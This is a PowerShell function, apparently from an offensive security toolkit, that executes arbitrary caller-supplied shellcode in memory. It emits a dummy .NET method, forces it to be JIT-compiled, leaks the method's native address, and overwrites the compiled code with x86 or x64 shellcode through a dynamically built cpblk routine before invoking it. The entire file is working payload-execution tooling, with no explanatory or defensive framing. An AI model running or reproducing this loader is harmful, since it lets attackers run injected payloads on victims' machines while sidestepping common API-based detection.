function Invoke-ShellcodeMSIL
{


    [CmdletBinding()] Param (
        [Parameter( Mandatory = $True )]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $Shellcode
    )

    function Get-MethodAddress
    {
        [CmdletBinding()] Param (
            [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
            [System.Reflection.MethodInfo]
            $MethodInfo
        )

        if ($MethodInfo.MethodImplementationFlags -eq 'InternalCall')
        {
            Write-Warning "$($MethodInfo.Name) is an InternalCall method. These methods always point to the same address."
        }

        try { $Type = [MethodLeaker] } catch [Management.Automation.RuntimeException] 
        {
            if ([IntPtr]::Size -eq 4) { $ReturnType = [UInt32] } else { $ReturnType = [UInt64] }

            $Domain = [AppDomain]::CurrentDomain
            $DynAssembly = New-Object System.Reflection.AssemblyName('MethodLeakAssembly')
            
            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('MethodLeakModule')
            $TypeBuilder = $ModuleBuilder.DefineType('MethodLeaker', [System.Reflection.TypeAttributes]::Public)
            
            $MethodBuilder = $TypeBuilder.DefineMethod('LeakMethod', [System.Reflection.MethodAttributes]::Public -bOr [System.Reflection.MethodAttributes]::Static, $ReturnType, $null)
            $Generator = $MethodBuilder.GetILGenerator()

            
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldftn, $MethodInfo)
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)

            
            $Type = $TypeBuilder.CreateType()
        }

        $Method = $Type.GetMethod('LeakMethod')

        try
        {
            
            $Address = $Method.Invoke($null, @())

            Write-Output (New-Object IntPtr -ArgumentList $Address)
        }
        catch [System.Management.Automation.MethodInvocationException]
        {
            Write-Error "$($MethodInfo.Name) cannot return an unmanaged address."
        }
    }


    try { $SmasherType =  [MethodSmasher] } catch [Management.Automation.RuntimeException] 
    {
        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('MethodSmasher')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $Att = New-Object System.Security.AllowPartiallyTrustedCallersAttribute
        $Constructor = $Att.GetType().GetConstructors()[0]
        $ObjectArray = New-Object System.Object[](0)
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($Constructor, $ObjectArray)
        $AssemblyBuilder.SetCustomAttribute($AttribBuilder)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('MethodSmasher')
        $ModAtt = New-Object System.Security.UnverifiableCodeAttribute
        $Constructor = $ModAtt.GetType().GetConstructors()[0]
        $ObjectArray = New-Object System.Object[](0)
        $ModAttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($Constructor, $ObjectArray)
        $ModuleBuilder.SetCustomAttribute($ModAttribBuilder)
        $TypeBuilder = $ModuleBuilder.DefineType('MethodSmasher', [System.Reflection.TypeAttributes]::Public)
        $Params = New-Object System.Type[](3)
        $Params[0] = [IntPtr]
        $Params[1] = [IntPtr]
        $Params[2] = [Int32]
        $MethodBuilder = $TypeBuilder.DefineMethod('OverwriteMethod', [System.Reflection.MethodAttributes]::Public -bOr [System.Reflection.MethodAttributes]::Static, $null, $Params)
        $Generator = $MethodBuilder.GetILGenerator()
        
        
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_1)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_2)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Volatile)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Cpblk)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)

        $SmasherType = $TypeBuilder.CreateType()
    }

    $OverwriteMethod = $SmasherType.GetMethod('OverwriteMethod')



    try { $Type = [SmashMe] } catch [Management.Automation.RuntimeException] 
    {
        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('SmashMe')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $Att = New-Object System.Security.AllowPartiallyTrustedCallersAttribute
        $Constructor = $Att.GetType().GetConstructors()[0]
        $ObjectArray = New-Object System.Object[](0)
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($Constructor, $ObjectArray)
        $AssemblyBuilder.SetCustomAttribute($AttribBuilder)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SmashMe')
        $ModAtt = New-Object System.Security.UnverifiableCodeAttribute
        $Constructor = $ModAtt.GetType().GetConstructors()[0]
        $ObjectArray = New-Object System.Object[](0)
        $ModAttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($Constructor, $ObjectArray)
        $ModuleBuilder.SetCustomAttribute($ModAttribBuilder)
        $TypeBuilder = $ModuleBuilder.DefineType('SmashMe', [System.Reflection.TypeAttributes]::Public)
        $Params = New-Object System.Type[](1)
        $Params[0] = [Int]
        $MethodBuilder = $TypeBuilder.DefineMethod('OverwriteMe', [System.Reflection.MethodAttributes]::Public -bOr [System.Reflection.MethodAttributes]::Static, [Int], $Params)
        $Generator = $MethodBuilder.GetILGenerator()
        $XorValue = 0x41424344
        $Generator.DeclareLocal([Int]) | Out-Null
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0)
        
        
        
        foreach ($CodeBlock in 1..100)
        {
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldc_I4, $XorValue)
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Xor)
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Stloc_0)
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldloc_0)
            $XorValue++
        }
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldc_I4, $XorValue)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Xor)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)
        $Type = $TypeBuilder.CreateType()
    }

    $TargetMethod = $Type.GetMethod('OverwriteMe')


    
    Write-Verbose 'Forcing target method to be JITed...'

    foreach ($Exec in 1..20)
    {
        $TargetMethod.Invoke($null, @(0x11112222)) | Out-Null
    }

    if ( [IntPtr]::Size -eq 4 )
    {
        
        $FinalShellcode = [Byte[]] @(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)
        

        Write-Verbose 'Preparing x86 shellcode...'
    }
    else
    {
        
        $FinalShellcode = [Byte[]] @(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,
                                     0x55,0xE8,0x0D,0x00,0x00,0x00,0x5D,0x41,
                                     0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x48,
                                     0x31,0xC0,0xC3)
        

        Write-Verbose 'Preparing x86_64 shellcode...'
    }

    
    $FinalShellcode += $Shellcode

    
    $ShellcodeAddress = [Runtime.InteropServices.Marshal]::AllocHGlobal($FinalShellcode.Length)

    Write-Verbose "Allocated shellcode at 0x$($ShellcodeAddress.ToString("X$([IntPtr]::Size*2)"))."

    
    
    [Runtime.InteropServices.Marshal]::Copy($FinalShellcode, 0, $ShellcodeAddress, $FinalShellcode.Length)

    $TargetMethodAddress = [IntPtr] (Get-MethodAddress $TargetMethod)

    Write-Verbose "Address of the method to be overwritten: 0x$($TargetMethodAddress.ToString("X$([IntPtr]::Size*2)"))"
    Write-Verbose 'Overwriting dummy method with the shellcode...'

    $Arguments = New-Object Object[](3)
    $Arguments[0] = $TargetMethodAddress
    $Arguments[1] = $ShellcodeAddress
    $Arguments[2] = $FinalShellcode.Length

    
    $OverwriteMethod.Invoke($null, $Arguments)

    Write-Verbose 'Executing shellcode...'

    
    $ShellcodeReturnValue = $TargetMethod.Invoke($null, @(0x11112222))

    if ($ShellcodeReturnValue -eq 0)
    {
        Write-Verbose 'Shellcode executed successfully!'
    }
}